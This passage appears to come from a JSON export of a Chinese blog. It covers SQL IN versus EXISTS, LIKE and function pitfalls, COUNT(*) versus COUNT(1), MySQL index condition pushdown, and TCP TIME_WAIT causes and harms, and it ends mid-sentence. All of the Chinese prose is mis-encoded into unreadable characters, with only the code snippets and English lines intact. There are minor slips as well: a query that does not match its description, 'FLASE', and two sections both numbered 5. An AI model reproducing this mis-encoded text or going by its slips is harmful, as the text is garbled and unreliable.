é€’ç»™å¤–éƒ¨æŸ¥è¯¢ã€‚\nç›¸å…³å­æŸ¥è¯¢çš„æ‰§è¡Œä¾èµ–äºå¤–éƒ¨æŸ¥è¯¢çš„æ•°æ®ï¼Œå¤–éƒ¨æŸ¥è¯¢æ‰§è¡Œä¸€è¡Œï¼Œå­æŸ¥è¯¢å°±æ‰§è¡Œä¸€æ¬¡ã€‚\næ•…éç›¸å…³å­æŸ¥è¯¢æ¯”ç›¸å…³å­æŸ¥è¯¢æ•ˆç‡é«˜ã€‚\n\n\n\n# 4. in å’Œ exist\n\n### 4.1 in\n\nè¯­æ³•:\n\n```sql\nSELECT Column(s) FROM table_name WHERE column IN (value1, value2, ... valueN);\nSELECT Column(s) FROM table_name WHERE column IN (SELECT Statement);\n```\n\n\nå³å¯ä»¥ç”¨åœ¨å­æŸ¥è¯¢, å¯ä»¥ä¸ç”¨\n\n\n### 4.2 exist\n\nè¯­æ³•ï¼š EXISTS subquery\nå‚æ•°ï¼š  subquery æ˜¯ä¸€ä¸ªå—é™çš„ SELECT è¯­å¥ (ä¸å…è®¸æœ‰ COMPUTE å­å¥å’Œ INTO å…³é”®å­—)ã€‚\nç»“æœç±»å‹ï¼š Boolean å¦‚æœå­æŸ¥è¯¢åŒ…å«è¡Œï¼Œåˆ™è¿”å› TRUE ï¼Œå¦åˆ™è¿”å› FLASE ã€‚\n\n```sql\nSELECT \nc.CustomerId,c.CompanyName \nFROM \nCustomers c\nWHERE \nEXISTS(\nSELECT o.OrderID FROM Orders o WHERE o.CustomerID=c.CustomerID\n)\n```\n\nè¿™é‡Œé¢çš„EXISTSæ˜¯å¦‚ä½•è¿ä½œå‘¢ï¼Ÿå­æŸ¥è¯¢è¿”å›çš„æ˜¯OrderIdå­—æ®µï¼Œå¯æ˜¯å¤–é¢çš„æŸ¥è¯¢è¦æ‰¾çš„æ˜¯CustomerIDå’ŒCompanyNameå­—æ®µï¼Œè¿™ä¸¤ä¸ªå­—æ®µè‚¯å®šä¸åœ¨OrderIDé‡Œé¢å•Šï¼Œè¿™æ˜¯å¦‚ä½•åŒ¹é…çš„å‘¢ï¼Ÿ\n\nEXISTSç”¨äºæ£€æŸ¥å­æŸ¥è¯¢æ˜¯å¦è‡³å°‘ä¼šè¿”å›ä¸€è¡Œæ•°æ®ï¼Œè¯¥å­æŸ¥è¯¢å®é™…ä¸Šå¹¶ä¸è¿”å›ä»»ä½•æ•°æ®ï¼Œè€Œæ˜¯è¿”å›å€¼Trueæˆ–False\n\n å¦‚æœEXISTSå­å¥è¿”å›TRUEï¼Œè¿™ä¸€è¡Œå¯ä½œä¸ºå¤–æŸ¥è¯¢çš„ç»“æœè¡Œï¼Œå¦åˆ™ä¸èƒ½ä½œä¸ºç»“æœã€‚\n\n\n\n### 4.3 in vs exist\n\n**4.3.1 in è§£æ**\n\n```sql\nselect * from A  where id in(select id from B)\n```\n\nä»¥ä¸ŠæŸ¥è¯¢ä½¿ç”¨äº†inè¯­å¥,in( )åªæ‰§è¡Œä¸€æ¬¡**,å®ƒæŸ¥å‡ºBè¡¨ä¸­çš„æ‰€æœ‰idå­—æ®µå¹¶ç¼“å­˜èµ·æ¥**.\n\nä¹‹å,æ£€æŸ¥Aè¡¨çš„idæ˜¯å¦ä¸Bè¡¨ä¸­çš„idç›¸ç­‰,å¦‚æœç›¸ç­‰åˆ™å°†Aè¡¨çš„è®°å½•åŠ å…¥ç»“æœé›†ä¸­,ç›´åˆ°éå†å®ŒAè¡¨çš„æ‰€æœ‰è®°å½•. å®ƒçš„æŸ¥è¯¢è¿‡ç¨‹ç±»ä¼¼äºä»¥ä¸‹è¿‡ç¨‹:\n\n```java\nList resultSet=[];\nArray A=(select * from A);\nArray B=(select id from B);\nfor(int i=0;i<A.length;i++) {\n   for(int j=0;j<B.length;j++) {\n      if(A[i].id==B[j].id) {\n         resultSet.add(A[i]);\n         break;\n      }\n   }\n}\nreturn resultSet;\n```\n\nå¯ä»¥çœ‹å‡º,å½“Bè¡¨æ•°æ®è¾ƒå¤§æ—¶ä¸é€‚åˆä½¿ç”¨in( ),å› ä¸ºå®ƒä¼šBè¡¨æ•°æ®å…¨éƒ¨éå†ä¸€æ¬¡.\n\n**4.3.2 exist è§£æ**\n\n```sql\nselect a.* from A a  where exists(select 1 from B b where a.id=b.id)\n```\n\nä»¥ä¸ŠæŸ¥è¯¢ä½¿ç”¨äº†existsè¯­å¥,exists( )ä¼šæ‰§è¡ŒA.lengthæ¬¡,å®ƒå¹¶ä¸ç¼“å­˜exists( )ç»“æœé›†\n\nå› ä¸ºexists( )ç»“æœé›†çš„å†…å®¹å¹¶ä¸é‡è¦,é‡è¦çš„æ˜¯ç»“æœé›†ä¸­æ˜¯å¦æœ‰è®°å½•,å¦‚æœæœ‰åˆ™è¿”å›true,æ²¡æœ‰åˆ™è¿”å›false. å®ƒçš„æŸ¥è¯¢è¿‡ç¨‹ç±»ä¼¼äºä»¥ä¸‹è¿‡ç¨‹\n\n```java\nList resultSet=[];\nArray A=(select * from A)\nfor(int i=0;i<A.length;i++) {\n   if(exists(A[i].id) {    //æ‰§è¡Œselect 1 from B b where b.id=a.idæ˜¯å¦æœ‰è®°å½•è¿”å›\n       resultSet.add(A[i]);\n   }\n}\nreturn resultSet;\n```\n\n\nå½“Bè¡¨æ¯”Aè¡¨æ•°æ®å¤§æ—¶é€‚åˆä½¿ç”¨exists( ),å› ä¸ºå®ƒæ²¡æœ‰é‚£ä¹ˆéå†æ“ä½œ,åªéœ€è¦å†æ‰§è¡Œä¸€æ¬¡æŸ¥è¯¢å°±è¡Œ.\n\n### 4.4 æ€»ç»“\n\n+  Inå¯ä»¥ä¸å­æŸ¥è¯¢ä¸€èµ·ä½¿ç”¨,ä¹Ÿå¯ä»¥ç›´æ¥in (a,bâ€¦..)ã€‚exist, not existä¸€èˆ¬éƒ½æ˜¯ä¸å­æŸ¥è¯¢ä¸€èµ·ä½¿ç”¨.\n\n+ æ³¨æ„,ä¸€ç›´ä»¥æ¥è®¤ä¸ºexistsæ¯”inæ•ˆç‡é«˜çš„è¯´æ³•æ˜¯ä¸å‡†ç¡®çš„ã€‚\n\n  ```\n  in ä¸å­æŸ¥è¯¢ä¸€èµ·ä½¿ç”¨çš„æ—¶å€™,åªèƒ½é’ˆå¯¹ä¸»æŸ¥è¯¢ä½¿ç”¨ç´¢å¼•\n  not inåˆ™ä¸ä¼šä½¿ç”¨ä»»ä½•ç´¢å¼•.\n  \n  existä¼šé’ˆå¯¹å­æŸ¥è¯¢çš„è¡¨ä½¿ç”¨ç´¢å¼•. \n  not existä¼šå¯¹ä¸»å­æŸ¥è¯¢éƒ½ä¼šä½¿ç”¨ç´¢å¼•.\n  ```\n\n+ INé€‚åˆäºå¤–è¡¨å¤§è€Œå†…è¡¨å°çš„æƒ…å†µï¼›EXISTSé€‚åˆäºå¤–è¡¨å°è€Œå†…è¡¨å¤§çš„æƒ…å†µã€‚\n\n+ å¦‚æœé€‰æ‹©NOT IN  å’Œ NOT EXISTS, è¦æ³¨æ„ NOT IN å’Œ NULL ç»“åˆçš„é—®é¢˜ã€‚\n\n\n\n# 5. æŸ¥è¯¢æ³¨æ„ç‚¹\n\n### 5.1 like ä¸è¦æŸ¥å‰ç¼€\n\n```Â sql\nWHERE Field LIKE '%blah%'\n```\n\nThat causes a table/index scan, because the LIKE value begins with a wildcard character.\n\n### 5.2 å­—æ®µä¸è¦ç”¨å‡½æ•°\n\n```sql\nWHERE FUNCTION(Field) = 'BLAH'\n```\n\nThe database server will have to evaluate FUNCTION() against every row in the table and then compare it to 'BLAH'.\n\nå¦‚æœå®åœ¨è¦ç”¨, å¯ä»¥å‡½æ•°ç”¨åœ¨åé¢\n\n```sql\nWHERE Field = INVERSE_FUNCTION('BLAH')\n```\n\n\n\n### 5.3 BETWEEN vs <= and >=\n\nå»ºè®®å°‘ä½¿ç”¨BETWEEN, å› ä¸ºä¸åŒçš„ sql å®ç°å¯èƒ½ä¸ä¸€æ ·\n\n+ between çš„èŒƒå›´æ˜¯åŒ…å«ä¸¤è¾¹çš„è¾¹ç•Œå€¼\n  egï¼š id between 3 and 7 ç­‰ä»·ä¸ id >=3 and id<=7\n\n+ not between çš„èŒƒå›´æ˜¯ä¸åŒ…å«è¾¹ç•Œå€¼\n  egï¼šid not between 3 and 7 ç­‰ä»·ä¸ id < 3 or id>7\n\n\n\n\n\n# 5. count(*), count(1) çš„åŒºåˆ«\n\n### 5.1 count(*), count(1), count(column)\n\n- COUNT(*) counts all rows\n- COUNT(column) counts non-NULLs only\n- [COUNT(1) is the same as COUNT(*)](https://stackoverflow.com/a/1221649/27535) because 1 is a non-null expressions\n\nYour use of COUNT(*) or COUNT(column) should be based on the desired output *only*.\n\n### 5.2 count(*), count(1)\n\nSame IO, same plan, the works\n\n\n\n# 6. ç´¢å¼•æ¡ä»¶ä¸‹æ¨ä¼˜åŒ–\n\nç´¢å¼•æ¡ä»¶ä¸‹æ¨ä¼˜åŒ–ï¼ˆIndex Condition Pushdown (ICP) ï¼‰æ˜¯MySQL5.6æ·»åŠ çš„ï¼Œç´¢å¼•æ¡ä»¶ä¸‹æ¨ä¼˜åŒ–å¯ä»¥å‡å°‘å­˜å‚¨å¼•æ“æŸ¥è¯¢åŸºç¡€è¡¨çš„æ¬¡æ•°ï¼Œä¹Ÿå¯ä»¥å‡å°‘MySQLæœåŠ¡å™¨ä»å­˜å‚¨å¼•æ“æ¥æ”¶æ•°æ®çš„æ¬¡æ•°ã€‚\n\nç´¢å¼•ä¸‹æ¨ä¼˜åŒ–æ˜¯é»˜è®¤å¼€å¯çš„ï¼Œå¯ä»¥é€šè¿‡ä¸‹é¢çš„è„šæœ¬æ§åˆ¶å¼€å…³ã€‚\n\n```sql\nSET optimizer_switch = 'index_condition_pushdown=off';  \nSET optimizer_switch = 'index_condition_pushdown=on';\n```\n\nåœ¨å¼€å§‹ä¹‹å‰å…ˆå…ˆå‡†å¤‡ä¸€å¼ ç”¨æˆ·è¡¨(user)ï¼Œå…¶ä¸­ä¸»è¦å‡ ä¸ªå­—æ®µæœ‰ï¼šidã€nameã€ageã€addressã€‚å»ºç«‹è”åˆç´¢å¼•ï¼ˆnameï¼Œageï¼‰ã€‚\n\n```sql\nSELECT * from user where name like 'åˆ˜%'\n```\n\næ ¹æ® \"æœ€ä½³å·¦å‰ç¼€\" çš„åŸåˆ™ï¼Œè¿™é‡Œä½¿ç”¨äº†è”åˆç´¢å¼•ï¼ˆnameï¼Œageï¼‰è¿›è¡Œäº†æŸ¥è¯¢ï¼Œæ€§èƒ½è¦æ¯”å…¨è¡¨æ‰«æè‚¯å®šè¦é«˜ã€‚\n\né—®é¢˜æ¥äº†ï¼Œå¦‚æœæœ‰å…¶ä»–çš„æ¡ä»¶å‘¢ï¼Ÿå‡è®¾åˆæœ‰ä¸€ä¸ªéœ€æ±‚ï¼Œè¦æ±‚åŒ¹é…å§“åç¬¬ä¸€ä¸ªå­—ä¸ºé™ˆï¼Œå¹´é¾„ä¸º20å²çš„ç”¨æˆ·ï¼Œæ­¤æ—¶çš„sqlè¯­å¥å¦‚ä¸‹ï¼š\n\n```sql\nSELECT * from user where name like 'åˆ˜%' and age=20\n```\n\n5.6ä¹‹å‰çš„ç‰ˆæœ¬æ˜¯æ²¡æœ‰ç´¢å¼•ä¸‹æ¨è¿™ä¸ªä¼˜åŒ–,  ä¼šå¿½ç•¥ageè¿™ä¸ªå­—æ®µï¼Œç›´æ¥é€šè¿‡nameè¿›è¡ŒæŸ¥è¯¢ï¼Œåœ¨(name,age)è¿™è¯¾æ ‘ä¸ŠæŸ¥æ‰¾åˆ°äº†ä¸¤ä¸ªç»“æœï¼Œç„¶åæ‹¿ç€å–åˆ°çš„idå€¼ä¸€æ¬¡æ¬¡çš„å›è¡¨æŸ¥è¯¢ï¼Œå› æ­¤è¿™ä¸ªè¿‡ç¨‹éœ€è¦å›è¡¨ä¸¤æ¬¡ã€‚\n\n5.6ç‰ˆæœ¬æ·»åŠ äº†ç´¢å¼•ä¸‹æ¨è¿™ä¸ªä¼˜åŒ–, å¹¶æ²¡æœ‰å¿½ç•¥ageè¿™ä¸ªå­—æ®µï¼Œè€Œæ˜¯åœ¨ç´¢å¼•å†…éƒ¨å°±åˆ¤æ–­äº†ageæ˜¯å¦ç­‰äº20ï¼Œå¯¹äºä¸ç­‰äº20çš„è®°å½•ç›´æ¥è·³è¿‡ï¼Œå› æ­¤åœ¨(name,age)è¿™æ£µç´¢å¼•æ ‘ä¸­åªåŒ¹é…åˆ°äº†ä¸€ä¸ªè®°å½•ï¼Œæ­¤æ—¶æ‹¿ç€è¿™ä¸ªidå»ä¸»é”®ç´¢å¼•æ ‘ä¸­å›è¡¨æŸ¥è¯¢å…¨éƒ¨æ•°æ®ï¼Œè¿™ä¸ªè¿‡ç¨‹åªéœ€è¦å›è¡¨ä¸€æ¬¡ã€‚\n\n\n\n\n\n# 10. å‚è€ƒèµ„æ–™:\n\n+ https://blog.csdn.net/shiyong1949/article/details/80923083\n+ https://www.journaldev.com/19165/sql-in-sql-not-in\n+ https://stackoverflow.com/questions/799584/what-makes-a-sql-statement-sargable\n+ https://stackoverflow.com/questions/173041/not-in-vs-not-exists\n+ https://www.polderknowledge.nl/2018/03/02/sql-beware-null-where-not/\n+ https://yefeihonours.github.io/post/mysql/in_and_exists/\n\n","tags":["sql"],"categories":["mysql"]},{"title":"tcpçš„TIME_WAITå’ŒCLOSE_WAIT","url":"%2Fp%2F7b71ec65.html","content":"\nTIME_WAIT æ˜¯å®¢æˆ·ç«¯ï¼ˆä¸»åŠ¨å‘èµ·æ–¹ï¼‰çš„çŠ¶æ€ï¼Œåœ¨å‘é€ç¬¬å››æ¬¡æŒ¥æ‰‹åè¿›å…¥çš„ä¸€ä¸ªçŠ¶æ€ã€‚æœåŠ¡å™¨ä¹Ÿæœ‰å¯èƒ½å‡ºç°TIME_WAITï¼ŒæœåŠ¡å™¨ä¹Ÿæœ‰å¯èƒ½æ˜¯æ–­å¼€è¿æ¥çš„ä¸»åŠ¨å‘èµ·æ–¹ã€‚\n\nè¿›å…¥TIME_WAITåï¼Œå®¢æˆ·ç«¯ç­‰å¾…2MSLæ—¶é—´ï¼ˆRFC793å»ºè®®æ˜¯ä¸¤åˆ†é’Ÿï¼‰ï¼Œåœ¨ Linux ä¸Š 2MSL çš„æ—¶é•¿æ˜¯ 60 ç§’ï¼Œä¹Ÿä¼šè¿›å…¥ CLOSED çŠ¶æ€ã€‚\n\n<!-- more -->\n\n# 1. TIME_WAIT\n\n### 1.1 ä½œç”¨\n\né‚£ä¹ˆå®¢æˆ·ç«¯ä¸ºä»€ä¹ˆè¿›å…¥ TIME_WAIT è€Œä¸æ˜¯ç›´æ¥å…³é—­ï¼Ÿ\n\n##### 1.  ä¿è¯æ­£ç¡®å…³é—­\n\n**ä¿è¯ã€Œè¢«åŠ¨å…³é—­è¿æ¥ã€çš„ä¸€æ–¹ï¼Œèƒ½è¢«æ­£ç¡®çš„å…³é—­**ã€‚\n\nTCP åè®®åœ¨å…³é—­è¿æ¥çš„å››æ¬¡æŒ¥æ‰‹ä¸­ï¼Œåœ¨ä¸»åŠ¨å…³é—­æ–¹å‘é€çš„æœ€åä¸€ä¸ª ACK æŠ¥æ–‡ï¼Œæœ‰å¯èƒ½ä¸¢å¤±ï¼Œè¿™æ—¶è¢«åŠ¨æ–¹ä¼šé‡æ–°å‘ FIN æŠ¥æ–‡, å¦‚æœè¿™æ—¶ä¸»åŠ¨æ–¹å¤„äº CLOSE çŠ¶æ€ ï¼Œå°±ä¼šå“åº” RST æŠ¥æ–‡è€Œä¸æ˜¯ ACK æŠ¥æ–‡ã€‚æ‰€ä»¥ä¸»åŠ¨æ–¹è¦å¤„äº TIME_WAIT çŠ¶æ€ï¼Œè€Œä¸èƒ½æ˜¯ CLOSEã€‚\n\n![img](tcpçš„TIME_WAITå’ŒCLOSE_WAIT/168-timewait4.jpeg)\n\n1ã€åœ¨â‘ ä¸­ï¼ŒCLient1ç«¯ä¸»åŠ¨å‘èµ·å…³é—­é“¾æ¥ï¼ŒServeré’ˆå¯¹Client1çš„FINå›æ‰§äº†ACKåŒ…ï¼Œç„¶åæ¥ç€å‘é€äº†è‡ªå·±çš„FINåŒ…ï¼Œç­‰å¾…Client1å›æ‰§æœ€ç»ˆçš„ACKåŒ…ã€‚\n\n2ã€åœ¨â‘¡ä¸­ï¼Œè¿™é‡Œå‡è®¾TIME_WAITçš„æ—¶é—´ä¸è¶³å¤Ÿå……åˆ†ï¼Œå½“Serverè¿˜æ²¡æœ‰æ”¶åˆ° ACK æ¶ˆæ¯æ—¶ï¼ŒClient1å°±ä¸»åŠ¨å˜æˆCLOSEDçŠ¶æ€ã€‚\n\n3ã€åœ¨â‘¢ä¸­ï¼Œç”±äºServerä¸€ç›´æ²¡æœ‰ç­‰åˆ°è‡ªå·±FINåŒ…çš„ACKåº”ç­”åŒ…ï¼Œå¯¼è‡´ä¸€ç›´å¤„äºLAST_ACKçŠ¶æ€ã€‚\n\n4ã€åœ¨â‘£ä¸­ï¼Œå› ä¸º æœåŠ¡ç«¯å› ä¸ºæ²¡æœ‰æ”¶åˆ° ACK æ¶ˆæ¯ï¼Œå½“Client2é‡æ–°ä¸Serverå»ºç«‹TCPé“¾æ¥ï¼Œè®¤ä¸ºå½“å‰è¿æ¥æ˜¯åˆæ³•çš„ï¼ŒCLient2é‡æ–°å‘é€ SYN æ¶ˆæ¯è¯·æ±‚æ¡æ‰‹æ—¶ä¼šæ”¶åˆ°Serverçš„ RST æ¶ˆæ¯ï¼Œè¿æ¥å»ºç«‹çš„è¿‡ç¨‹å°±ä¼šè¢«ç»ˆæ­¢ã€‚\n\n##### 2. é˜²æ­¢ç›¸åŒå››å…ƒç»„å†æ¬¡æ”¶åˆ°\n\né˜²æ­¢å†å²è¿æ¥ä¸­çš„æ•°æ®ï¼Œè¢«åé¢ç›¸åŒå››å…ƒç»„çš„è¿æ¥é”™è¯¯çš„æ¥æ”¶ã€‚\n\nTCP æŠ¥æ–‡å¯èƒ½ç”±äºè·¯ç”±å™¨å¼‚å¸¸è€Œ â€œè¿·è·¯â€ï¼Œåœ¨è¿·é€”æœŸé—´ï¼ŒTCP å‘é€ç«¯å¯èƒ½å› ç¡®è®¤è¶…æ—¶è€Œé‡å‘è¿™ä¸ªæŠ¥æ–‡ï¼Œè¿·é€”çš„æŠ¥æ–‡åœ¨è·¯ç”±å™¨ä¿®å¤åä¹Ÿä¼šè¢«é€åˆ°æœ€ç»ˆç›®çš„åœ°ï¼Œè¿™ä¸ªåŸæ¥çš„è¿·é€”æŠ¥æ–‡å°±ç§°ä¸º lost duplicateã€‚åœ¨å…³é—­ä¸€ä¸ª TCP è¿æ¥åï¼Œé©¬ä¸Šåˆé‡æ–°å»ºç«‹èµ·ä¸€ä¸ªç›¸åŒçš„ IP åœ°å€å’Œç«¯å£ä¹‹é—´çš„ TCP è¿æ¥ï¼Œåä¸€ä¸ªè¿æ¥è¢«ç§°ä¸ºå‰ä¸€ä¸ªè¿æ¥çš„åŒ–èº«ï¼Œé‚£ä¹ˆæœ‰å¯èƒ½å‡ºç°è¿™ç§æƒ…å†µï¼Œå‰ä¸€ä¸ªè¿æ¥çš„è¿·é€”é‡å¤æŠ¥æ–‡åœ¨å‰ä¸€ä¸ªè¿æ¥ç»ˆæ­¢åå‡ºç°ï¼Œä»è€Œè¢«è¯¯è§£æˆä»å±äºæ–°çš„åŒ–èº«ã€‚\n\nä¸ºäº†é¿å…è¿™ä¸ªæƒ… å†µï¼Œ TIME_WAIT çŠ¶æ€éœ€è¦æŒç»­ 2MSLï¼Œå› ä¸ºè¿™æ ·å°±å¯ä»¥ä¿è¯å½“æˆåŠŸå»ºç«‹ä¸€ä¸ª TCP è¿æ¥çš„æ—¶å€™ï¼Œæ¥è‡ªè¿æ¥å…ˆå‰åŒ–èº«çš„é‡å¤æŠ¥æ–‡å·²ç»åœ¨ç½‘ç»œä¸­æ¶ˆé€ã€‚\n\n### 1.2 è¿‡å¤šçš„åŸå› \n\nå¦‚æœæœåŠ¡ç«¯å‡ºç°å¤§é‡çš„ TIME_WAIT çŠ¶æ€çš„ TCP è¿æ¥ï¼Œå°±æ˜¯è¯´æ˜æœåŠ¡ç«¯ä¸»åŠ¨æ–­å¼€äº†å¾ˆå¤š TCP è¿æ¥ã€‚é—®é¢˜æ¥äº†ï¼Œä»€ä¹ˆåœºæ™¯ä¸‹æœåŠ¡ç«¯ä¼šä¸»åŠ¨æ–­å¼€è¿æ¥å‘¢ï¼Ÿ\n\nç¬¬ä¸€ä¸ªåœºæ™¯ï¼šHTTP æ²¡æœ‰ä½¿ç”¨é•¿è¿æ¥\nç¬¬äºŒä¸ªåœºæ™¯ï¼šHTTP é•¿è¿æ¥è¶…æ—¶\nç¬¬ä¸‰ä¸ªåœºæ™¯ï¼šHTTP é•¿è¿æ¥çš„è¯·æ±‚æ•°é‡è¾¾åˆ°ä¸Šé™\n\n##### 1. HTTP æ²¡æœ‰ä½¿ç”¨é•¿è¿æ¥\n\nä» HTTP/1.1 å¼€å§‹ï¼Œ å°±é»˜è®¤æ˜¯å¼€å¯äº† Keep-Aliveï¼Œç°åœ¨å¤§å¤šæ•°æµè§ˆå™¨éƒ½é»˜è®¤æ˜¯ä½¿ç”¨ HTTP/1.1ï¼Œæ‰€ä»¥ Keep-Alive éƒ½æ˜¯é»˜è®¤æ‰“å¼€çš„ã€‚ä¸€æ—¦å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯è¾¾æˆåè®®ï¼Œé‚£ä¹ˆé•¿è¿æ¥å°±å»ºç«‹å¥½äº†ã€‚\n\n\n\n**å®¢æˆ·ç«¯ç¦ç”¨äº† HTTP Keep-Aliveï¼ŒæœåŠ¡ç«¯å¼€å¯ HTTP Keep-Aliveï¼Œè°æ˜¯ä¸»åŠ¨å…³é—­æ–¹ï¼Ÿ**\n\nå½“å®¢æˆ·ç«¯ç¦ç”¨äº† HTTP Keep-Aliveï¼Œè¿™æ—¶å€™ HTTP è¯·æ±‚çš„ header å°±ä¼šæœ‰ `Connection:close` ä¿¡æ¯ï¼Œè¿™æ—¶æœåŠ¡ç«¯åœ¨å‘å®Œ HTTP å“åº”åï¼Œå°±ä¼šä¸»åŠ¨å…³é—­è¿æ¥ã€‚ä¸å†é‡ç”¨è¿™ä¸ªè¿æ¥çš„æ—¶æœºå°±åªæœ‰åœ¨æœåŠ¡ç«¯äº†ã€‚\n\n\n\n**å®¢æˆ·ç«¯å¼€å¯äº† HTTP Keep-Aliveï¼ŒæœåŠ¡ç«¯ç¦ç”¨äº† HTTP Keep-Aliveï¼Œè°æ˜¯ä¸»åŠ¨å…³é—­æ–¹ï¼Ÿ**\n\nå½“å®¢æˆ·ç«¯å¼€å¯äº† HTTP Keep-Aliveï¼Œè€ŒæœåŠ¡ç«¯ç¦ç”¨äº† HTTP Keep-Aliveï¼Œè¿™æ—¶æœåŠ¡ç«¯åœ¨å‘å®Œ HTTP å“åº”åï¼ŒæœåŠ¡ç«¯ä¹Ÿä¼šä¸»åŠ¨å…³é—­è¿æ¥ã€‚\n\nå½“æœåŠ¡ç«¯å‡ºç°å¤§é‡çš„ TIME_WAIT çŠ¶æ€è¿æ¥çš„æ—¶å€™ï¼Œå¯ä»¥æ’æŸ¥ä¸‹æ˜¯å¦å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯éƒ½å¼€å¯äº† HTTP Keep-Aliveã€‚\n\n\n\n##### 2. HTTP é•¿è¿æ¥è¶…æ—¶\n\nå‡è®¾è®¾ç½®äº† HTTP é•¿è¿æ¥çš„è¶…æ—¶æ—¶é—´æ˜¯ 60 ç§’ï¼Œnginx å°±ä¼šå¯åŠ¨ä¸€ä¸ªã€Œå®šæ—¶å™¨ã€ï¼Œå¦‚æœå®¢æˆ·ç«¯åœ¨å®Œåä¸€ä¸ª HTTP è¯·æ±‚åï¼Œåœ¨ 60 ç§’å†…éƒ½æ²¡æœ‰å†å‘èµ·æ–°çš„è¯·æ±‚ï¼Œå®šæ—¶å™¨çš„æ—¶é—´ä¸€åˆ°ï¼Œnginx å°±ä¼šè§¦å‘å›è°ƒå‡½æ•°æ¥å…³é—­è¯¥è¿æ¥ï¼Œé‚£ä¹ˆæ­¤æ—¶æœåŠ¡ç«¯ä¸Šå°±ä¼šå‡ºç° TIME_WAIT çŠ¶æ€çš„è¿æ¥ã€‚\n\nå½“æœåŠ¡ç«¯å‡ºç°å¤§é‡ TIME_WAIT çŠ¶æ€çš„è¿æ¥æ—¶ï¼Œå¦‚æœç°è±¡æ˜¯æœ‰å¤§é‡çš„å®¢æˆ·ç«¯å»ºç«‹å®Œ TCP è¿æ¥åï¼Œå¾ˆé•¿ä¸€æ®µæ—¶é—´æ²¡æœ‰å‘é€æ•°æ®ï¼Œé‚£ä¹ˆå¤§æ¦‚ç‡å°±æ˜¯å› ä¸º HTTP é•¿è¿æ¥è¶…æ—¶ï¼Œå¯¼è‡´æœåŠ¡ç«¯ä¸»åŠ¨å…³é—­è¿æ¥ï¼Œäº§ç”Ÿå¤§é‡å¤„äº TIME_WAIT çŠ¶æ€çš„è¿æ¥ã€‚\n\nå¯ä»¥å¾€ç½‘ç»œé—®é¢˜çš„æ–¹å‘æ’æŸ¥ï¼Œæ¯”å¦‚æ˜¯å¦æ˜¯å› ä¸ºç½‘ç»œé—®é¢˜ï¼Œå¯¼è‡´å®¢æˆ·ç«¯å‘é€çš„æ•°æ®ä¸€ç›´æ²¡æœ‰è¢«æœåŠ¡ç«¯æ¥æ”¶åˆ°ï¼Œä»¥è‡³äº HTTP é•¿è¿æ¥è¶…æ—¶ã€‚\n\n##### 3. HTTP é•¿è¿æ¥çš„è¯·æ±‚æ•°é‡è¾¾åˆ°ä¸Šé™\n\nWeb æœåŠ¡ç«¯é€šå¸¸ä¼šæœ‰ä¸ªå‚æ•°ï¼Œæ¥å®šä¹‰ä¸€æ¡ HTTP é•¿è¿æ¥ä¸Šæœ€å¤§èƒ½å¤„ç†çš„è¯·æ±‚æ•°é‡ï¼Œå½“è¶…è¿‡æœ€å¤§é™åˆ¶æ—¶ï¼Œå°±ä¼šä¸»åŠ¨å…³é—­è¿æ¥ã€‚\n\næ¯”å¦‚ nginx çš„ keepalive_requests è¿™ä¸ªå‚æ•°ï¼Œè¿™ä¸ªå‚æ•°æ˜¯æŒ‡ä¸€ä¸ª HTTP é•¿è¿æ¥å»ºç«‹ä¹‹åï¼Œnginx å°±ä¼šä¸ºè¿™ä¸ªè¿æ¥è®¾ç½®ä¸€ä¸ªè®¡æ•°å™¨ï¼Œè®°å½•è¿™ä¸ª HTTP é•¿è¿æ¥ä¸Šå·²ç»æ¥æ”¶å¹¶å¤„ç†çš„å®¢æˆ·ç«¯è¯·æ±‚çš„æ•°é‡ã€‚å¦‚æœè¾¾åˆ°è¿™ä¸ªå‚æ•°è®¾ç½®çš„æœ€å¤§å€¼æ—¶ï¼Œåˆ™ nginx ä¼šä¸»åŠ¨å…³é—­è¿™ä¸ªé•¿è¿æ¥ï¼Œé‚£ä¹ˆæ­¤æ—¶æœåŠ¡ç«¯ä¸Šå°±ä¼šå‡ºç° TIME_WAIT çŠ¶æ€çš„è¿æ¥ã€‚\n\nkeepalive_requests å‚æ•°çš„é»˜è®¤å€¼æ˜¯ 100 ï¼Œæ„å‘³ç€æ¯ä¸ª HTTP é•¿è¿æ¥æœ€å¤šåªèƒ½è·‘ 100 æ¬¡è¯·æ±‚ï¼Œè¿™ä¸ªå‚æ•°å¾€å¾€è¢«å¤§å¤šæ•°äººå¿½ç•¥ï¼Œå› ä¸ºå½“ QPS (æ¯ç§’è¯·æ±‚æ•°) ä¸æ˜¯å¾ˆé«˜æ—¶ï¼Œé»˜è®¤å€¼ 100 å‡‘åˆå¤Ÿç”¨ã€‚\n\nä½†æ˜¯ï¼Œå¯¹äºä¸€äº› QPS æ¯”è¾ƒé«˜çš„åœºæ™¯ï¼Œæ¯”å¦‚è¶…è¿‡ 10000 QPSï¼Œç”šè‡³è¾¾åˆ° 30000 , 50000 ç”šè‡³æ›´é«˜ï¼Œå¦‚æœ keepalive_requests å‚æ•°å€¼æ˜¯ 100ï¼Œè¿™æ—¶å€™å°± nginx å°±ä¼šå¾ˆé¢‘ç¹åœ°å…³é—­è¿æ¥ï¼Œé‚£ä¹ˆæ­¤æ—¶æœåŠ¡ç«¯ä¸Šå°±ä¼šå‡ºå¤§é‡çš„ TIME_WAIT çŠ¶æ€ã€‚\n\né’ˆå¯¹è¿™ä¸ªåœºæ™¯ä¸‹ï¼Œè§£å†³çš„æ–¹å¼ä¹Ÿå¾ˆç®€å•ï¼Œè°ƒå¤§ nginx çš„ keepalive_requests å‚æ•°å°±è¡Œã€‚\n\n### 1.3 å±å®³\n\nè¿‡å¤šçš„ TIME-WAIT çŠ¶æ€ä¸»è¦çš„å±å®³æœ‰ä¸¤ç§ï¼š\n\n- ç¬¬ä¸€æ˜¯å ç”¨ç³»ç»Ÿèµ„æºï¼Œæ¯”å¦‚æ–‡ä»¶æè¿°ç¬¦ã€å†…å­˜èµ„æºã€CPU èµ„æºç­‰ï¼›\n- ç¬¬äºŒæ˜¯å ç”¨ç«¯å£èµ„æºï¼Œç«¯å£èµ„æºä¹Ÿæ˜¯æœ‰é™çš„ï¼Œä¸€èˆ¬å¯ä»¥å¼€å¯çš„ç«¯å£ä¸º `32768ï½61000`ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ `net.ipv4.ip_local_port_range`å‚æ•°æŒ‡å®šèŒƒå›´ã€‚\n\n\n\n### 1.4 ä¼˜åŒ–\n\nTIME_WAIT 